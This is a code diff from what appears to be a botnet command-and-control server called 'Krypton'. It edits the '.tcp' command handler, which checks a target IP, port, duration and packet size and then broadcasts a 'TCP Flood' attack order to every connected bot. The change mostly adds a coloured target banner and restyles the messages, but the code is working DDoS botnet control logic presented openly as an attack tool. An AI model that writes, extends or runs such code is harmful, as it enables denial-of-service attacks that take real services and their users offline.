@@ -6,11 +6,21 @@ def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, cl
         port = args[2]
         secs = args[3]
         size = args[4]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s  IP:%s %s
+            %sPORT:%s %s
+            %sTIME:%s %s
+            %sSIZE:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, size, Fore.CYAN, Fore.LIGHTWHITE_EX, 'TCP Flood')
+
         if validate_ip(ip):
             if validate_port(port):
                 if validate_time(secs):
                     if validate_size(size):
-                        send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
+                        for x in xxxx.split('\n'):
+                            send(client, '\x1b[3;31;40m'+ x)
+                        send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                         broadcast(data)
                     else:
                         send(client, Fore.RED + '\nInvalid packet size (1-65500 bytes)\n')
@@ -21,4 +31,4 @@ def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, cl
         else:
             send(client, Fore.RED + '\nInvalid IP-address\n')
     else:
-        send(client, '\nUsage: .tcp [IP] [PORT] [TIME] [SIZE]\n')
+        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.tcp [IP] [PORT] [TIME] [SIZE]\n')
